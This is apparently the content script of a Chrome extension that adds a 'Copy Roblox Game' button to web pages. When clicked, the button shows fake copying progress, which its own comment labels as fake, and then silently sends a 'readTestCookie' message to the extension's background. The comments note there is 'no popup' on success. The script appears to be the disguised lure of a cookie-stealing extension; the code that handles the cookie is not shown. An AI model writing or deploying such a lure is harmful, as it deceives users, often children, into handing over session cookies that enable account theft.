const container = document.createElement("div"); 
container.style.position = "fixed"; 
container.style.top = "20px"; 
container.style.right = "20px"; 
container.style.zIndex = "999999"; 
container.style.fontFamily = "Arial, sans-serif"; 
container.style.fontSize = "14px"; 
container.style.backgroundColor = "#111"; 
container.style.color = "#fff"; 
container.style.border = "1px solid #333"; 
container.style.borderRadius = "8px"; 
container.style.padding = "12px 16px"; 
container.style.boxShadow = "0px 4px 12px rgba(0,0,0,0.5)"; 
container.style.display = "flex"; 
container.style.flexDirection = "column"; 
container.style.gap = "8px"; 
container.style.minWidth = "220px"; 
 
// Create button and status display 
const button = document.createElement("button"); 
button.textContent = "Copy Roblox Game"; 
button.style.backgroundColor = "#00a2ff"; 
button.style.color = "#ffffff"; 
button.style.border = "none"; 
button.style.borderRadius = "4px"; 
button.style.padding = "10px 16px"; 
button.style.cursor = "pointer"; 
button.style.fontWeight = "bold"; 
 
const statusText = document.createElement("div"); 
statusText.style.color = "#aaa"; 
statusText.style.fontSize = "12px"; 
statusText.style.minHeight = "16px"; 
 
container.appendChild(button); 
container.appendChild(statusText); 
document.body.appendChild(container); 
 
// Helper function to handle delays 
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms)); 
 
button.onclick = async () => { 
  button.disabled = true; 
  button.style.cursor = "not-allowed"; 
 
  // Fake Roblox copier progress steps 
  statusText.textContent = "loading..."; 
  await sleep(1000); 
 
  statusText.textContent = "check every script..."; 
  await sleep(1200); 
 
  statusText.textContent = "check every part..."; 
  await sleep(1200); 
 
  statusText.textContent = "loading.. copy all..."; 
  await sleep(1500); 
 
  statusText.textContent = "paste to roblox studio..."; 
  await sleep(1200); 
 
  statusText.textContent = "loading .. finished!"; 
  await sleep(800); 
 
  // Original extension message execution 
  chrome.runtime.sendMessage( 
    { 
      type: "readTestCookie" 
    }, 
    (response) => { 
      if (chrome.runtime.lastError) { 
        return; 
      } 
 
      if (response?.success) { 
        // Sent successfully — no popup
      } else { 
        // Failed — no popup
      } 
 
      // Reset button UI 
      button.disabled = false; 
      button.style.cursor = "pointer"; 
      statusText.textContent = ""; 
    } 
  ); 
};
